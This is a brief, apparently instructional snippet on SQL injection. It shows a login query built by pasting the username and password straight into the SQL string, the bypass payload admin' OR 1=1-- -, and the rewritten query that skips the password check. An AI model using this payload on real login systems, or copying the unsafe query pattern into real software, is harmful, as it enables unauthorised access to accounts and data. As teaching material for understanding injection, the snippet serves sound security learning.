
Original query

```
SELECT * FROM users WHERE username = '{username}' AND password = '{password}'
```

Injection query

```
admin' OR 1=1-- -
```

```
SELECT * FROM users WHERE username = 'admin' OR 1=1-- -' AND password = 'password'
```

```
SELECT * FROM users WHERE username = 'admin' OR 1=1
```



